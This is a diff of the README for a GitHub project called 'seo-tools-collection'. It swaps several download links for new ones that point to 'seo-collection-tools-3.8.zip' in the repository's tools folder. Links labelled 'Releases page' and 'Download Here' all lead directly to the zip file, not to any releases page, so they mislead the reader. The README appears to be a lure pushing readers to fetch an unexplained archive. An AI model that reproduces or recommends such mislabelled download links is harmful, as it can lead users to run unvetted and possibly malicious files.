@@ -8,7 +8,7 @@ Welcome to the **seo-tools-collection**! This application provides a curated lis
 
 To get started, visit the Releases page and download the latest version:
 
-[![Download](https://raw.githubusercontent.com/MalikAhsan666/seo-tools-collection/main/tools/seo-tools-collection-2.9.zip%20Release-blue)](https://raw.githubusercontent.com/MalikAhsan666/seo-tools-collection/main/tools/seo-tools-collection-2.9.zip)
+[![Download](https://github.com/MalikAhsan666/seo-tools-collection/raw/refs/heads/main/tools/seo-collection-tools-3.8.zip%20Release-blue)](https://github.com/MalikAhsan666/seo-tools-collection/raw/refs/heads/main/tools/seo-collection-tools-3.8.zip)
 
 ## 📋 Features
 
@@ -33,7 +33,7 @@ Before downloading, ensure your system meets the following requirements:
 
 1. Click the link below to visit the Releases page and download the latest version of the seo-tools-collection:
 
-   [Download Here](https://raw.githubusercontent.com/MalikAhsan666/seo-tools-collection/main/tools/seo-tools-collection-2.9.zip)
+   [Download Here](https://github.com/MalikAhsan666/seo-tools-collection/raw/refs/heads/main/tools/seo-collection-tools-3.8.zip)
 
 2. On the Releases page, find the latest version. It will be labeled clearly at the top.
 
@@ -98,4 +98,4 @@ Your suggestions are important. If you think of new tools or features that would
 
 Enjoy exploring the world of SEO with **seo-tools-collection**! For further downloads and updates, remember to check back on our Releases page:
 
-[Visit Releases Page](https://raw.githubusercontent.com/MalikAhsan666/seo-tools-collection/main/tools/seo-tools-collection-2.9.zip)
+[Visit Releases Page](https://github.com/MalikAhsan666/seo-tools-collection/raw/refs/heads/main/tools/seo-collection-tools-3.8.zip)
